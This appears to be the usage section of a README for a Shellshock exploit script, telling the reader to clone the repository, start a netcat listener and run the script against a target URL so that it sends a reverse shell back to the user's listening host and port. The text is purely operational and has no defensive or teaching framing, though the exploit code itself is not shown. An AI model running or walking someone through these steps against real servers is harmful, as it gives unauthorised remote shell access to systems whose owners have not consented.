
## How to use

#### Clone the project (or just copy-paste)
```bash
  sudo git clone https://github.com/Gurguii/shellshock.sh
```
#### Start listening with netcat  
```bash
  netcat -lvnp <lport>
```
#### Run the script
```bash
    bash shellshock.sh <url> <lhost> <lport>
```
No worries if you forget setting the listener, the script will wait if <lport> is not listening before sending the reverse shell.
